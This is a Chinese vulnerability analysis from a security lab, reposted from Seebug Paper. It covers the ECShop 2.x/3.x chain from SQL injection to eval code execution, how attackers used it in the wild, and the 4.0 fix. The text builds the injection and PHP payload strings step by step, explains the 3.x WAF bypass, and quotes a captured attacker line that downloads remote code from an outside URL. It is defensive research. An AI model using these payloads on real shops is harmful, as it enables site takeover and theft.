### 作者： Badcode@知道创宇404实验室  

### 背景

ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。2018年6月13日，知道创宇404积极防御团队通过知道创宇旗下云防御产品“创宇盾”防御拦截并捕获到一个针对某著名区块链交易所网站的攻击，通过分析，发现攻击者利用的正式ECShop
2.x版本的0day漏洞攻击。于2018年6月14日，提交到知道创宇Seebug漏洞平台并
_[收录](https://www.seebug.org/vuldb/ssvid-97343)_ 。

随后于2018年8月31日，ID为“ringk3y”研究人员在其博客公开这个[漏洞](http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/)，并做了详细分析，该分析收录在[Seebug
Paper](https://paper.seebug.org/691/)。

知道创宇404积极防御团队于2018年9月2日正式对外发布[《ECShop全系列版本的远程代码执行漏洞》](https://www.yunaq.com/news/5b8ca434796db41371c1cf45/)预警。

从2018年的6月13日首次拦截后，知道创宇404实验室多个团队对这个利用ECShop
0day攻击事件进行持续的监控分析，从下文的分析结果可以看出一个0day漏洞在实际攻击中的各个阶段的“堕落”过程。

### 漏洞分析

该漏洞影响到ECShop
2.x和3.x版本，是一个典型的“二次漏洞”，通过`user.php`文件中`display()`函数的模板变量可控，从而造成SQL注入漏洞，而后又通过SQL注入漏洞将恶意代码注入到危险函数`eval`中，从而实现了任意代码执行。

值得一提的是攻击者利用的payload只适用于ECShop 2.x版本导致有部分安全分析者认为该漏洞不影响ECShop
3.x，这个是因为在3.x的版本里有引入防注入攻击的安全代码，通过我们分析发现该防御代码完全可以绕过实现对ECShop 3.x的攻击（详见下文分析）。

注：以下代码分析基于ECShop 2.7.3

####  **SQL 注入漏洞**

#### 首先看到`ecshop/user.php`

![1.png](https://image.3001.net/images/20180912/1536746652_5b98e49c52de9.png!small)![2.png](https://image.3001.net/images/20180912/1536746652_5b98e49c65533.png!small)

可以看到 $back_act 是从 HTTP_REFERER 获取到的， HTTP_REFERER 是外部可控的，这也是万恶的根源。  
接着将 back_act 变量传递给 assign 函数，跟进 ecshop/includes/cls_template.php

![3.png](https://image.3001.net/images/20180912/1536746874_5b98e57a5b10e.png!small)

可以从注释了解这个函数的功能，是注册模板变量，也就是`$back_act`变成了`$this->_var[$back_act]=$back_act`，而后调用`display`函数

![4.png](https://image.3001.net/images/20180912/1536747014_5b98e606e7479.png!small)

从`user.php`调用`display`函数，传递进来的`$filename`是`user_passport.dwt`，从函数来看，首先会调用`$this->fetch`来处理`user_passport.dwt`模板文件，`fetch`函数中会调用`$this->make_compiled`来编译模板。`user_passport.dwt`其中一段如下：

![5.png](https://image.3001.net/images/20180912/1536747045_5b98e625255d1.png!small)

`make_compiled`会将模板中的变量解析，也就是在这个时候将上面`assign`中注册到的变量`$back_act`传递进去了，解析完变量之后返回到`display`函数中。此时`$out`是解析变量后的html内容，判断`$this->_echash`是否在`$out`中，若在，使用`$this->_echash`来分割内容，得到`$k`然后交给`insert_mod`处理。

![6.png](https://image.3001.net/images/20180912/1536747291_5b98e71bde838.png!small)

由于`_echash`是默认的，不是随机生成的，所以`$val`内容可随意控制。跟进`$this->insert_mod`

![7.png](https://image.3001.net/images/20180912/1536747309_5b98e72d73fed.png!small)

`$val`传递进来，先用`|`分割，得到`$fun`和`$para`，`$para`进行反序列操作，`$fun`和`insert_`拼接，最后动态调用`$fun($para)`，函数名部分可控，参数完全可控。接下来就是寻找以`insert_`开头的可利用的函数了，在`ecshop/includes/lib_insert.php`有一个`insert_ads`函数，正好满足要求。看下`insert_ads`

![8.png](https://image.3001.net/images/20180912/1536747489_5b98e7e1c791d.png!small)![9.png](https://image.3001.net/images/20180912/1536747489_5b98e7e1e9de9.png!small)

`$arr`是可控的，并且会拼接到SQL语句中，这就造成了SQL注入漏洞。

根据上面的流程，可以构造出如下形式的payload

![10.png](https://image.3001.net/images/20180912/1536747570_5b98e832c8315.png!small)

实际可利用payload  
![11.png](https://image.3001.net/images/20180912/1536747570_5b98e832c5121.png!small)

![12.png](https://image.3001.net/images/20180912/1536747749_5b98e8e504846.png!small)

####  **代码执行**

#### 继续看`insert_ads`函数

![13.png](https://image.3001.net/images/20180912/1536747772_5b98e8fc7cdae.png!small)

可以看到在SQL查询结束之后会调用模板类的`fetch`方法，在`user.php`中调用`display`，然后调用`fetch`的时候传入的参数是`user_passport.dwt`，而在此处传入的参数是`$position_style`，向上溯源，发现是`$row['position_style']`赋值而来，也就是SQL语句查询的结果，结果上面这个SQL注入漏洞，SQL查询的结果可控，也就是`$position_style`可控。

要到`$position_style =
$row['position_style'];`还有一个条件，就是`$row['position_id']`要等于`$arr['id']`，查询结果可控，`arr['id']`同样可控。

之后`$position_style`会拼接`'str:'`传入`fetch`函数，跟进`fetch`

![14.png](https://image.3001.net/images/20180912/1536747792_5b98e910689bf.png!small)

因为之前拼接`'str:'`了，所以`strncmp($filename,'str:', 4) ==
0`为真，然后会调用危险函数`$this->_eval`，这就是最终触发漏洞的点。但是参数在传递之前要经过`fetch_str`方法的处理，跟进

![15.png](https://image.3001.net/images/20180913/1536809651_5b99dab30edc0.png!small)

![下载.png](https://image.3001.net/images/20180913/1536809726_5b99dafebabb3.png!small)

第一个正则会匹配一些关键字，然后置空，主要看下最后一个正则

![16.png](https://image.3001.net/images/20180913/1536809760_5b99db201c5c6.png!small)

这个正则是将捕获到的值交于`$this-select()`函数处理。例如，`$source`的值是`xxx{$abc}xxx`，正则捕获到的group 1
就是`$abc`，然后就会调用`$this-select("$abc")`。

![QQ截图20180913113857.png](https://image.3001.net/images/20180913/1536809951_5b99dbdfce0c1.png!small)

跟进`select`函数  
![18.png](https://image.3001.net/images/20180913/1536809760_5b99db2022b83.png!small)

![19.png](https://image.3001.net/images/20180913/1536809987_5b99dc036e878.png!small)

当传入的变量的第一个字符是`$`，会返回由 php
标签包含变量的字符串，最终返回到`_eval()`危险函数内，执行。在返回之前，还调用了`$this->get_var`处理，跟进 `et_var`

![20.png](https://image.3001.net/images/20180913/1536810027_5b99dc2ba802b.png!small)![21.png](https://image.3001.net/images/20180913/1536810027_5b99dc2bba32f.png!small)

当传入的变量没有`.$`时，调用`$this->make_var`，跟进`make_var`  
![22.png](https://image.3001.net/images/20180913/1536810027_5b99dc2bd0be2.png!small)

在这里结合`select`函数里面的语句来看，`<?php echo $this->_var[' $val
'];?>`，要成功执行代码的话，`$val`必须要把`['`闭合，所以payload构造，从下往上构造，`$val`为`abc'];echo
phpinfo();//`；从`select`函数进入`get_var`的条件是第一个字符是`$`，所以payload变成了`$abc'];echo
phpinfo();//`；而要进入到`select`，需要被捕获，payload变成了`{$abc'];echo
phpinfo();//}`，这里因为payload的是`phpinfo()`，这里会被`fetch_str`函数的第一个正则匹配到，需要变换一下，所以payload变为`{$abc'];echo
phpinfo/**/();//}`，到这里为止，php 恶意代码就构造完成了。

  

接下来就是把构造好的代码通过SQL注入漏洞传给`$position_style`。 这里可以用union select
来控制查询的结果，根据之前的流程，`$row['position_id']`和`$arr['id']`要相等，`$row['position_id']`是第二列的结果，`$position_style`是第九列的结果。`$arr['id']`传入`'
/*`,`$arr['num']`传入`*/ union select
1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10---`，`0x27202f2a`是`'
/*`的16进制值，也就是`$row['position_id']`的值，`0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d`是上面构造的php代码的16进制值，也就是`$position_style`。

![QQ截图20180913114149.png](https://image.3001.net/images/20180913/1536816885_5b99f6f5ee5ad.png!small)

结合之前的SQL漏洞的payload构造，所以最终的payload的是

![24.png](https://image.3001.net/images/20180913/1536816955_5b99f73b68e40.png!small)

![QQ截图20180913114203.png](https://image.3001.net/images/20180913/1536816923_5b99f71b89ccc.png!small)

可以看到成功的执行了`phpinfo()`。

####  **ECShop 3.x 绕过**

上述的测试环境都是2.7.3的，理论上打2.x都没问题，而在3.x上是不行的，原因是3.x自带了个WAF(`ecshop/includes/safety.php`)，对所有传入的参数都做了检测，按照上面构造的
payload ，`union select` 会触发SQL注入的检测规则，有兴趣的可以去绕绕，我没绕过。。

下面的测试版本为ECshop3.0，3.x版本的`echash`是`45ea207d7a2b68c49582d2d22adf953a`。 上面说了
`insert_ads` 函数存在注入，并且有两个可控点，`$arr['id']`和`$arr['num']`，可以将`union
select`通过两个参数传递进去，一个参数传递一个关键字，中间的可以使用`/**/`注释掉，这样就不会触发WAF。

![QQ截图20180913114216.png](https://image.3001.net/images/20180913/1536817029_5b99f785e0920.png!small)

### 实际攻击分析

上文提到该漏洞最早由知道创宇404积极防御团队通过知道创宇旗下云防御产品“创宇盾”在2018年6月13日拦截并捕获，随后针对这个漏洞的攻击情况做了详细的监控及跟进：

####  **第一阶：0day在野之“APT攻击” (2018年6月13日)**

首次捕获到 2.x 的 payload 是被用来攻击某区块链交易所网站，因此我们高度怀疑攻击者是用 0day 来攻击区块链交易所的 apt团队。样本中
payload 通过HTTP 请求头的`Referer`字段植入，如下

![QQ截图20180913114234.png](https://image.3001.net/images/20180913/1536817053_5b99f79d282ed.png!small)

把捕获的 payload 转码出来看

![28.png](https://image.3001.net/images/20180913/1536817072_5b99f7b07471a.png!small)

恶意代码

![29.png](https://image.3001.net/images/20180913/1536817139_5b99f7f352f3b.png!small)

base64部分的内容是  

![30.png](https://image.3001.net/images/20180913/1536817260_5b99f86cbe8b5.png!small)

可以看到，没有写入
webshell，而是直接接收`$_POST['Nox']`参数，进行base64解码后直接传入`eval`函数执行代码，相当于一个无文件的
webshell ，非常隐蔽。

![QQ截图20180913114257.png](https://image.3001.net/images/20180913/1536817181_5b99f81d5f995.png!small)

本次攻击是由一个日本ip(35.200.*.*)发起,通过攻击的手法及使用的paylaod等情况来看，并直接了当地用来攻击某著名区块链交易所，我们高度怀疑是目的性非常明确的“APT攻击”。

####  **第二阶：0day在野之“黑产攻击” （2018年8月）**

在随后整个7月都没有出现利用该漏洞攻击的记录直到8月初，在整个8月拦截捕获该0day漏洞攻击记录10余次，攻击者使用的 payload
都相同，且都是一个菲律宾IP(180.191.*.*)发起的攻击。如下：

![32.png](https://image.3001.net/images/20180913/1536817139_5b99f7f38f89e.png!small)

`//
file_put_contents('1.php',file_get_contents('<http://uee.me/MrJc>'));`和这篇[分析文章](https://xz.aliyun.com/t/2689)里捕获到的样本一致。

从整个8月拦截的10余次攻击目标，payload等手法来看，我们认为极有可能该0day漏洞已经被流入到“高端黑产”团队，并进行了批量自动化攻击。

####  **第三阶：0day曝光之“疯狂攻击” （2018年8月31日后）**

#### 在2018年8月31日漏洞细节被公开之后，攻击数量开始增加，捕获到的 payload 也变的多种多样，漏洞被广泛利用。

![QQ截图20180913134217.png](https://image.3001.net/images/20180913/1536817341_5b99f8bd36f85.png!small)

从这些人使用的攻击目标、手法及payload（攻击使用的payload仍然只适用于2.x版本，目前为止没有看到使用针对3.x
payload攻击）等情况来看，考虑大量的“低端黑产”玩家开始加入进来，继续“疯狂”的抓鸡行动中，榨干这个漏洞的最后一滴“油水”...

### 漏洞影响范围及修复

根据ZoomEye网络空间搜索引擎对ECShop关键字的[搜索结果](https://www.zoomeye.org/searchResult?q=ecshop)，共找到42400
条历史记录。

![QQ截图20180913134250.png](https://image.3001.net/images/20180913/1536817409_5b99f9014ea56.png!small)

####  **漏洞修复**

#### 目前我们分析下载最新版的ECShop 4.0里对这个漏洞进行修复：

#### 看到`ecshop4/ecshop/includes/lib_insert.php`

![QQ截图20180913134309.png](https://image.3001.net/images/20180913/1536817409_5b99f9018e383.png!small)

可以看到，将传递进来的`$arr[id]`和`$arr[num]`强制转换成整型，这样就没法利用这个漏洞了。

另外我们注意到官方并没有发布针对老版本的(2.x和3.x)的独立修复补丁，相关老版本的用户可参考ECShop 4.0代码来修复或者直接升级到ECShop
4.0。

### 小结

本次ECShop这个漏洞挖掘到漏洞利用非常有技术含量，可以算是一个经典的“二次漏洞”案例，从一个SQL注入漏洞最后完美实现转变为代码执行漏洞。另外从这个漏洞在野外实际利用的过程，也非常的“经典”，完美重现了一个0day漏洞被挖掘利用转变为“武器”后的完美历程：从被用来目标明确的“定向攻击”，再到“黑产”高端玩家，直到最后在曝光后沦为黑产“抓鸡”工具的“堕落”
...

### 参考链接

  * [ecshop2.x代码执行](http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/)
  * [ECShop全系列版本远程代码执行高危漏洞分析](https://xz.aliyun.com/t/2689)
  * [ecshop 2.7.3 代码执行漏洞](https://www.seebug.org/vuldb/ssvid-97343)
  * [ZoomEye 搜索结果](https://www.zoomeye.org/searchResult?q=ecshop)
  * [安全预警| ECShop全系列版本远程代码执行高危漏洞 创宇盾无需升级即可防御](https://www.yunaq.com/news/5b8ca434796db41371c1cf45/)
  * [二次漏洞](https://wenku.baidu.com/view/ff7cea6f6529647d26285259.html)

本文转自 Seebug Paper ，原文戳：<https://paper.seebug.org/695/>

